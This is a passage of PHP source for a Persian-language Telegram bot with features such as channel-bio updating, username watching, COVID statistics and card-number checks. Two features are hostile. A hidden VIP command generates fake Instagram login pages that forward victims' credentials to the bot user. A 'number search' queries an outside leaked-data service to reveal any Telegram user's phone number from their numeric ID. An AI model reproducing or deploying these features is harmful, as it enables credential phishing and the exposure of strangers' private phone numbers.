file_put_contents('time.json',json_encode($timeJs),true);
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✔️ | کانال با موفقیت به *( $title )* تغییر کرد . . . !
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | کانالی با ای دی *( $text )* وجود ندارد ای دی کانال خود را درست ارسال کنید

🔰 مثال : `@SlowTM`
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
}else{
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | لطفاً ای دی کانال خود را با ( @ ) ارسال کنید و از حروف انگلیسی استفاده کنید ! 

🔰 مثال : `@SlowTM`
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
}
elseif(strpos($text , '/DelTime') !== false and $type == "vip" and $tc == 'private'){
if($link != null){
$dcoeockencn = file_get_contents("time.txt");
$fncndkckek = str_replace($link, "none . . . !", $dcoeockencn);
file_put_contents("time.txt", $fncndkckek);
$aone = array_diff($timeJs[$chat_id]['link'], $link);
$timeJs[$chat_id]['link'] = $aone;
$timeJs[$chat_id]['bio'] = $aone;
file_put_contents("time.json",json_encode($timeJs,true));
$timeJs[$chat_id]['warn'] = "0";
file_put_contents("time.json",json_encode($timeJs,true));
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🗑 | با موفقیت کانال شما حذف شد از لیست !

📂 | اکنون شما می‌توانید کانال جدیدی را تنظیم کنید
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}else{
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🤔 | شما کانالی ثبت نکرده ایـد کـه بخواهید آنرا حذف کنید !
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
}
elseif(strpos($text , '/time') !== false and $type == "vip" and $tc == 'private'){
if($link == null){
$datas["step"] = "SenSdId";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🚩 | لطفاً ای دی کانال خود را *با @ ارسال کنید* . . . ! 
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}else{
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✔️ | هر کاربر تنها میتواند یک کانال ثبت کند ! شما قبلاً یک کانال ثبت کرده اید
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
}
if($step == "SenSdId" and $text != "🔙 | بازگشت" and $tc == 'private'){
$text = str_replace(["q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m"],["Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Z","X","C","V","B","N","M"],$text);
$info = file_get_contents("time.txt");
$exp = explode("\n",$info);
if(in_array($text,$exp)){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
💯 | این کانال از قبل توسط یک نفر دیگر ثبت شده است ! 
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
exit();
}
if(strpos($text, '@') !== false and preg_match('/^(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)|(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)|(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)/',$text)){
$title = bot('getchat',['chat_id'=>"$text"])->result->title;
if($title != null){
$dcoeockencn = file_get_contents("time.txt");
$fncndkckek = str_replace($link, "none . . . !", $dcoeockencn);
file_put_contents("time.txt", $fncndkckek);
$myfile2 = fopen("time.txt", "a") or die("Unable to open file!");
fwrite($myfile2, "$text\n");
fclose($myfile2);
$timeJs["$from_id"]['link'][] = "$text";
file_put_contents('time.json',json_encode($timeJs),true);
$datas["step"] = "SenSbIo-$text";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✔️ | کانال *( $title )* با موفقیت ثبت شد در لیست ! 

🔆 | اکنون بیو کانال خود را ارسال کنید . . .



⚠️ در تنظیم بیو کانال خود میتوانید از راهنما زیر استفاده کنید ! 

💤 ساعت : TIME
💤 تاریخ شمسی : FA
💤 تاریخ میلادی : DATE
💤 ایموجی رندوم : EMOJI

❗️| *مثال* :
`سلام به کانال ما خوش اومدید ( EMOJI )

ساعت الان TIME است 〽️
تاریخ امروز FA است 🌐`
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | کانالی با ای دی *( $text )* وجود ندارد ای دی کانال خود را درست ارسال کنید

🔰 مثال : `@SlowTM`
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
}else{
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | لطفاً ای دی کانال خود را با ( @ ) ارسال کنید و از حروف انگلیسی استفاده کنید ! 

🔰 مثال : `@SlowTM`
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
}
elseif(strpos($step, "SenSbIo-") !== false and $text != "🔙 | بازگشت" and $tc == 'private'){
$x = explode("-",$step);
if(!in_array($from_id,$timeJs['users'])){
$timeJs["$from_id"]['warn'] = "0";
$timeJs['users'][] = "$from_id";
file_put_contents('time.json',json_encode($timeJs),true);
}
$timeJs["$from_id"]['bio'][] = "$text";
file_put_contents('time.json',json_encode($timeJs),true);
$fonts = [["𝟎","𝟏","𝟐","𝟑","𝟒","𝟓","𝟔","𝟕","𝟖","𝟗"]];
$dateF = str_replace(range(0,9),$fonts[array_rand($fonts)],jdate("Y/m/d"));
date_default_timezone_set('Asia/Tehran');
$fonts = [["𝟎","𝟏","𝟐","𝟑","𝟒","𝟓","𝟔","𝟕","𝟖","𝟗"]];
$time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("H:i"));
$fonts = [["𝟎","𝟏","𝟐","𝟑","𝟒","𝟓","𝟔","𝟕","𝟖","𝟗"]];
$date2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("Y/m/d"));
$random =["😂","😐","😁","😘","❤️","😍","😞","🌹","😆","😀","😕","😇","🙃","🙂","‌🥲","😎","🧐","🤪","🤩","🥳","🙁","🤯","😶","😴"];
$emoji = $random[array_rand($random)];
$text = str_replace('TIME',$time2,$text);
$text = str_replace('DATE',$date2,$text);
$text = str_replace('FA',$dateF,$text);
$text = str_replace('EMOJI',$emoji,$text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🎉 | کانال شما با موفقیت ثبت شد 

🎊 | اطلاعات کانال شما : 

🔗 | ایدی کانال شما : *$x[1]*

🔐 | بیو کانال شما : 
`$text`
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
}
elseif(strpos($text , '/bio') !== false and $type == "vip" and $tc == 'private'){
if($link != null){
$datas["step"] = "SetBio";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔆 | اکنون بیو کانال خود را ارسال کنید . . .



⚠️ در تنظیم بیو کانال خود میتوانید از راهنما زیر استفاده کنید ! 

💤 ساعت : TIME
💤 تاریخ شمسی : FA
💤 تاریخ میلادی : DATE
💤 ایموجی رندوم : EMOJI

❗️| *مثال* :
`سلام به کانال ما خوش اومدید ( EMOJI )

ساعت الان TIME است 〽️
تاریخ امروز FA است 🌐`
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}else{
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🤔 | شما کانالی ثبت نکرده ایـد ابتدا یک کانال تنظیم کنید !
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
}
if($step == "SetBio" and $text != "🔙 | بازگشت" and $tc == 'private'){
foreach($timeJs["$chat_id"]["link"] as $link){
$title = bot('getchat',['chat_id'=>"$link"])->result->title;
}
$timeJs["$from_id"]['bio'] = "$text";
file_put_contents('time.json',json_encode($timeJs),true);
$fonts = [["𝟎","𝟏","𝟐","𝟑","𝟒","𝟓","𝟔","𝟕","𝟖","𝟗"]];
$dateF = str_replace(range(0,9),$fonts[array_rand($fonts)],jdate("Y/m/d"));
date_default_timezone_set('Asia/Tehran');
$fonts = [["𝟎","𝟏","𝟐","𝟑","𝟒","𝟓","𝟔","𝟕","𝟖","𝟗"]];
$time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("H:i"));
$fonts = [["𝟎","𝟏","𝟐","𝟑","𝟒","𝟓","𝟔","𝟕","𝟖","𝟗"]];
$date2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("Y/m/d"));
$random =["😂","😐","😁","😘","❤️","😍","😞","🌹","😆","😀","😕","😇","🙃","🙂","‌🥲","😎","🧐","🤪","🤩","🥳","🙁","🤯","😶","😴"];
$emoji = $random[array_rand($random)];
$text = str_replace('TIME',$time2,$text);
$text = str_replace('DATE',$date2,$text);
$text = str_replace('FA',$dateF,$text);
$text = str_replace('EMOJI',$emoji,$text);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
💛 | بیو کانال *( $title )* با موفقیت تغییر کرد به : 

`$text`
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
}
if($text == "🔗 | تگ گیر" and $type == "vip" and $tc == 'private'){
if(!in_array($from_id,$file["users"])){
$file["users"][] = "$from_id";
$outjson = json_encode($file,true);
file_put_contents("data.json",$outjson);
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ | راهنما گرفتن تگ . . . ! 

🌐 | وقتی شما آیدی را ثبت کنید هر لحظه که آن آیدی باز شود از روی کانالی یا شخصی آنرا باز کند ربات فوراً به شما اطلاع رسانی میکند که آن آیدی را قفل کنید و آن آیدی برای شما شود . . . ! 


💤 | لیست میانبر ها : 


✅ | دریافت لیست تگ های ثبت شده شما دستور : /list

✅ | ثبت تگ *( آیدی )* جدید دستور : /get

✅ | حذف لیست تگ های شما دستور : /del

✅ | لیست تگ های آزاد شده دستور : /free
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
elseif(strpos($text , '/get') !== false and $type == "vip" and $tc == 'private'){
if(count($tags) <= 2){
$datas["step"] = "taggers";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔗 | تگ *( ای دی )* مورد نظر را ارسال کنید هر لحظه که این تگ *( ای دی )* باز شود به شما *اطلاع رسانی* میشود ! 
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❗️| شما _3_ عدد تگ *( ای دی )* را ثبت کرده اید . . . 
",
'parse_mode'=>'MarkDown',
]);
}
}
if($step == "taggers" and $text != "🔙 | بازگشت" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
if(in_array($text,$tags)){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ | این تگ *( ای دی )* از قبل در لیست تگ های ثبت شده شما موجود است . . . !
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
exit();
}
if(strpos($text, '@') !== false and preg_match('/^(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)|(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)|(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)/',$text)){
$file["$from_id"]['tags'][] = "$text";
$filejson = json_encode($file,true);
file_put_contents("data.json",$filejson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ | تگ *$text* با موفقیت ثبت شد . . . !
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | تگ *( ای دی )* مورد نظر خود را با @ ارسال کنید و از حروف *انگلیسی* استفاده کنید


مثال : @SlowTM
",
'parse_mode'=>'MarkDown',
]);
}
}
elseif(strpos($text , '/del') !== false and $type == "vip" and $tc == 'private'){
if($tags == null){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❗️| شما تگی *( ای دی )* ثبت نکرده اید . . .
",
'parse_mode'=>'MarkDown',
]);
exit();
}
unset($file["$from_id"]['tags']);
$filejson = json_encode($file,true);
file_put_contents("data.json",$filejson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ | با موفقیت لیست تگ های *( ایدی های )* شما حذف شدند 
",
'parse_mode'=>'MarkDown',
]);
}
elseif(strpos($text , '/list') !== false and $type == "vip" and $tc == 'private'){
if($tags == null){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❗️| شما تگی *( ای دی )* ثبت نکرده اید . . .
",
'parse_mode'=>'MarkDown',
]);
exit();
}
foreach($tags as $id){
$ids .= "💤 ⟩••• $id\n";
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔰 ⟨ لیست تگ های انتخابی شما : 

$ids
",
'parse_mode'=>"HTML",
]);
}
elseif(strpos($text , '/free') !== false and $type == "vip" and $tc == 'private'){
if($free == null){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❗️| تگ *( ای دی )* باز شده ای موجود نمی‌باشد . . .
",
'parse_mode'=>'MarkDown',
]);
exit();
}
foreach($free as $id){
$ids .= "✔️ | $id\n";
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔰 ⟨ لیست تگ های آزاد شده . . . !

$ids
",
'parse_mode'=>"HTML",
]);
}
if($text == "🌐 | اطلاعات کرونا" and $tc == 'private'){
$datas["step"] = "coronadukld";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
💤 اسم کشوری که میخواهید آمار کرونا آنرا بدست آوردید ارسال کنید . . . 

🔰 _مثال_ : `iran`
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "coronadukld" and $text != "🔙 | بازگشت" and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
♻️ درحال پردازش چند لحظه صبر کنید
",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyback
]);
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
if(preg_match('/^(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)|(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)|(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)/',$text) ){
$starts = microtime(true);
$corona = json_decode(file_get_contents("$domain/API/corona.php?corona=$text"), true);
if($corona["results"] == "The country name is incorrect !"){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ اسم کشور مورد را اشتباه ارسال کردید
",
'reply_markup'=>$menu
]);
}else{
$finish = microtime(true);
$ms = round($finish - $starts,3);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
📊 آمار کرونایی کشور $text تا کنون . . .

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄

● ᴄᴀsᴇs : {$corona["information"]["cases"]}
○ ᴅᴇᴀᴛʜ  : {$corona["information"]["death"]}
○ ʀᴇᴄᴏᴠᴇʀᴇᴅ : {$corona["information"]["recovered"]}
● 𝓢𝓔𝓡𝓐𝓒𝓗 𝓣𝓘𝓜𝓔 : $ms ms

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••

",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔰 لطفاً اسم *کشور* مورد نظر را به انگلیسی وارد کنید 

_مثال_ : `iran`
",
'parse_mode'=>'MarkDown',
'reply_markup'=>$menu
]);
}
}
elseif($text == "🔰 | شماره من"){
$num = json_decode(file_get_contents("https://sidepath.ml/finde/finder.php/?key=smoke&id=$from_id"), true);
if($num["Result"] == "Number Not Found !"){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | شماره شما در دیتابیس موجود نمیباشد 
",
]);
}else{
if($num['Result']['username'] != "@0"){
$user_name_x = $num['Result']['username'];
}else{
$user_name_x = "𝑛𝑜𝑛𝑒";
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"

✅ | متاسفانه شمار شما در دیتابیس است با موفقیت پیدا شد 

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄

● ᴺᵁᴹᴮᴱᴿ : +{$num["Result"]["phone"]}
○ ᴜsᴇʀ ɪᴅ  : {$num["Result"]["user_id"]}
○ ᴜsᴇʀ ɴᴀᴍᴇ : $user_name_x

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
}
if($text == "i_love_taraneh" and $type == "vip"){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
if($coin >= 5){
$rand = Random();
mkdir("../page");
mkdir("../page/$rand");
$post = file_get_contents("YuT/temp.php");
$post = str_replace("[*[ADMIN]*]",$from_id,$post);
file_put_contents("../page/$rand/temp.php",$post);
$file1 = file_get_contents("YuT/index.html");
file_put_contents("../page/$rand/index.html",$file1);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ | لینک فیک پیج اینستاگرام شما ساخته شد . . .

💤 Link : $link/page/$rand

❗️| هر کسی وارد لینک شما بشود و اطلاعات اینستاگرام خود را وارد کند اطلاعات حساب کاربری فرد برای شما ارسال میشود . . .
",
]);
$datas = json_decode(file_get_contents("data/$from_id/$from_id.json"),true);
$coin = $datas["coin"];
$newcoin = $coin - 5;
$datas["coin"] = $newcoin;
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"📌 | جهت هک لوکشین به `5` سکه لازم دارید . . .",
'parse_mode'=>'Markdown', 
'reply_markup'=>$menu
]);
}
}

if($text == "🔍 | جستجوی شماره" and $tc == 'private'){
$datas["step"] = "dhdkdllallxls";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔎 | جهت دریافت شماره کاربر مورد نظر ای دی عددی کاربر را وارد کنید . . .
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "dhdkdllallxls" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
if(preg_match('/[a-z]/i',$text)){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ فقط با ای دی عددی سرچ کنید نه با یوزرنیم یا با پیام فور شده ❗️",
'parse_mode'=>'Markdown', 
'reply_markup'=>$menu
]);
}
if(preg_match('~bot|t(elegram)?\.me|@|\.ir|\.com~i',$text)){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❌ اگه نمیدانید ای دی عددی چطوری میشه دریافت کرد به راهنما تصویری مراجعه کنید در ربات ❗️",
'parse_mode'=>'Markdown', 
'reply_markup'=>$menu
]);
}
} 
if($step == "dhdkdllallxls" and $tc == 'private'){
$starts = microtime(true);
$numm = json_decode(file_get_contents("https://sidepath.ml/finde/finder.php/?key=smoke&id=$text"), true);
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
if(is_numeric($text)){
if($numm["Result"] == "Number Not Found !"){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ متاسفانه شماره فرد در دیتابیس موجود نمیباشد !
",
'reply_markup'=>$menu
]);
}else{
if($numm['Result']['username'] != "@0"){
$user_name_x = $numm['Result']['username'];
}else{
$user_name_x = "𝑛𝑜𝑛𝑒";
}
$finish = microtime(true);
$ms = round($finish - $starts,3);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ | شماره فرد مورد نظر در دیتابیس موجود است با موفقیت پیدا شد 

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄

● ᴺᵁᴹᴮᴱᴿ : +{$numm["Result"]["phone"]}
○ ᴜsᴇʀ ɪᴅ  : {$numm["Result"]["user_id"]}
○ ᴜsᴇʀ ɴᴀᴍᴇ : $user_name_x
● 𝓢𝓔𝓡𝓐𝓒𝓗 𝓣𝓘𝓜𝓔 : $ms ms
◇ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ : $from_id

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••

",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❗️ لطفاً فقط با *ای دی عددی* سرچ کنید و فقط عدد ارسال کنید از *( , . : ! ؟ )* استفاده نکنید بین ای دی عددی
❗️*ای دی عددی* را بصورت *انگلیسی* وارد کنید 
",
'parse_mode'=>'MarkDown',
]);
}
}
if($text == "💳 | صحت کارت بانکی" and $tc == 'private'){
$datas["step"] = "carddukld";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🔆 جهت دیدن صحت و درست بودن کارت بانکی شماره کارت مورد نظر را ارسال کنید . . .
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "carddukld" and $text != "🔙 | بازگشت" and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
♻️ درحال پردازش چند لحظه صبر کنید
",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyback
]);
$starts = microtime(true);
$card = json_decode(file_get_contents("$domain/API/card.php?card=$text"), true);
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
if(is_numeric($text)){
if($card["results"] == "This Card Number Is #Invalid !"){
$finish = microtime(true);
$ms = round($finish - $starts,3);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄

❗️شماره کارت مورد نظر معتبر نمیباشد و فیک است

● 𝓢𝓔𝓡𝓐𝓒𝓗 𝓣𝓘𝓜𝓔 : $ms ms

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••

",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
if($card["results"] == "The Card Number Should Only Be 16 Digits !"){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ شماره کارت فقط باید 16 رقم باشد
",
'reply_markup'=>$menu
]);
}
